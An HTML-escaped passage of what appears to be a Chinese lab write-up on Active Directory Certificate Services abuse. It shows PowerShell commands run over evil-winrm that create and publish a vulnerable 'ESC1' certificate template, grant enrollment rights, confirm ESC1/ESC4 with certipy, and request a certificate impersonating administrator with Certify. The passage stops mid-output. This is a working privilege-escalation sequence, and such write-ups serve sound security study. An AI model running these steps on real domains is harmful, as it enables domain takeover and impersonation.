+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Certificate-Application-Policy&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.3.6.1.5.5.7.3.2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Certificate-Name-Flag&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Enrollment-Flag&amp;#39;&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Minimal-Key-Size&amp;#39;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Private-Key-Flag&amp;#39;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16842752&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-RA-Signature&amp;#39;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Template-Minor-Revision&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Template-Schema-Version&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKICriticalExtensions&amp;#39;&lt;/span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.5.29.15&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.5.29.7&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIDefaultCSPs&amp;#39;&lt;/span&gt;                 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3,Microsoft Base DSS Cryptographic Provider&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2,Microsoft Base Cryptographic Provider v1.0&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1,Microsoft Enhanced Cryptographic Provider v1.0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIDefaultKeySpec&amp;#39;&lt;/span&gt;              &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIExpirationPeriod&amp;#39;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;byte&lt;span style=&#34;color:#f92672&#34;&gt;[]](&lt;/span&gt;0,64,57,135,46,225,254,255&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIExtendedKeyUsage&amp;#39;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.3.6.1.5.5.7.3.2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIKeyUsage&amp;#39;&lt;/span&gt;                    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;byte&lt;span style=&#34;color:#f92672&#34;&gt;[]](&lt;/span&gt;128,0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIMaxIssuingDepth&amp;#39;&lt;/span&gt;             &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKIOverlapPeriod&amp;#39;&lt;/span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;byte&lt;span style=&#34;color:#f92672&#34;&gt;[]](&lt;/span&gt;0,128,166,10,255,222,255,255&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; New-ADObject -Path $TemplatePath -Name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESC1&amp;#39;&lt;/span&gt; -Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pKICertificateTemplate&amp;#39;&lt;/span&gt; -OtherAttributes $Template
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Props
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在ca中注册模板&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; $CAs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Get-ADObject -SearchBase $EnrollmentPath -SearchScope OneLevel -Filter *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;foreach &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$CA in $CAs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Set-ADObject -Identity $CA.DistinguishedName -Add @&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;certificateTemplates&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESC1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当注册完毕后，模板只是注册在了ca当中，但是没有人能利用它，我们需要在其中属性中写入能请求的组，作为它的onwer，我们是有权限的。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$TemplateDN &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=ESC1,CN=Certificate Templates,CN=Public Key Services,CN=Services,&lt;/span&gt;$ConfigNC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$acl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Get-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$TemplateDN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$rule &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New-Object System.DirectoryServices.ActiveDirectoryAccessRule&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;New-Object System.Security.Principal.NTAccount&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PKIadmins&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ExtendedRight&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;GUID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;00000000-0000-0000-0000-000000000000&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$acl.AddAccessRule&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rule&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Set-ACL -Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$TemplateDN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -AclObject $acl
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没有报错则是正常的，我们尝试使用certipy远程查找一下可利用模板&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/adcs-test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...........
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Name                       : ESC1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Display Name                        : ESC1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Authorities             : wackadcs-DC-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enabled                             : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Client Authentication               : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollment Agent                    : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Any Purpose                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollee Supplies Subject           : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Name Flag               : EnrolleeSuppliesSubject
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Extended Key Usage                  : Client Authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Manager Approval           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Key Archival               : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Authorized Signatures Required      : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Schema Version                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Validity Period                     : &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; year
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Renewal Period                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; weeks
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Minimum RSA Key Length              : &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Created                    : 2025-08-29T10:18:30+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Last Modified              : 2025-08-29T10:18:30+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Enrollment Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enrollment Rights               : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Object Control Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Owner                           : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Full Control Principals         : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Owner Principals          : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Dacl Principals           : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Enrollable Principals      : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User ACL Principals             : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Vulnerabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC1                              : Enrollee supplies subject and template allows client authentication.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC4                              : Template is owned by user.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到Enrollment Rights: WACKADCS.COM\PKIAdmins这则允许我们当前组去以任意身份请求证书,我们可以利用Certify和Rubeus尝试利用&lt;/p&gt;
+&lt;p&gt;先以administrator身份请求证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; .&lt;span style=&#34;color:#ae81ff&#34;&gt;\C&lt;/span&gt;ertify.exe request /ca:dc.wackadcs.com&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;ackadcs-DC-CA /template:ESC /altname:administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   _____          _   _  __              
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  / ____|        | | &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;/ _|             
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; | |     ___ _ __| |_ _| |_ _   _        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; | |    / _ &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;__| __| |  _| | | |      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; | |___|  __/ |  | |_| | | | |_| |       
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;____&lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;__|_|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;_|_|_|  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;_, |   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             __/ |       
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            |___./        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v1.1.0                               
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Action: Request a Certificates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Current user context    : WACKADCS&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No subject name specified, using current context as subject.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Template                : ESC
